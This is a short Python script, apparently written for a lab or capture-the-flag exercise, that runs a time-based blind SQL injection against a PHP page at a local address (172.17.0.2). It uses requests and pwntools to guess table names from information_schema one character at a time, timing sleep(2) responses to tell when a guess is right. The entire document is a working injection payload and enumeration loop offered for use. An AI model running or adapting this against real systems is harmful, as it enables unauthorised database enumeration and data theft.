#!/usr/bin/python3
from pwn import log
import string, requests, time

characters = string.ascii_lowercase
bar = log.progress("Tables")

value = ""

for table in range(0,3):
    value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
    for position in range(0,10):
        for character in characters:
            tstr = time.time()
            requests.get(f"http://172.17.0.2/example.php?id=1'and if(substr((select table_name from information_schema.tables where table_schema='example' limit {table},1),{position},1)='{character}',sleep(2),1)-- -")
            tend = time.time()
            if (tend - tstr) > 2:
                value += character
                bar.status(value)
